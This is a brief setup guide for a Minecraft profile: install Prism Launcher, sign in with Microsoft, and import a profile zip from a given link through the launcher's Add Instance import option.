Game Setup Guide

Follow these 3 easy steps to get up and running using Prism Launcher
Step 1

Download Prism Launcher

Prism Launcher is an open-source Minecraft launcher that makes managing custom profiles incredibly easy.

  1. Go to the official website and download the installer for your operating system (Windows, Mac, or Linux).
  2. Run the installer and complete the setup wizard.
  3. Launch the application once installed. It will ask you to select your language and pick a Java version (the default options work perfectly).
Go to Prism Download Page
Step 2

Sign In to Your Account

When you start the launcher for the first time, it will prompt you to log into your Minecraft account.

  1. Click "Sign in with Microsoft", and follow the instructions to sign in.
⚠️ Tip: If it errors out, try again in half an hour. It does that sometimes!
Step 3

Import the Profile

Instead of downloading a massive file manually, you can pull the profile directly into Prism using the link below.

  1. Copy this link to your clipboard:

    https://dont-spam-me.uk/26.2.zip

  2. Inside Prism Launcher, click Add Instance.
  3. Select Import from the menu options.
  4. Paste the copied link directly into the URL field and confirm.

Once the download finishes, double-click the new profile icon on your dashboard to start playing!
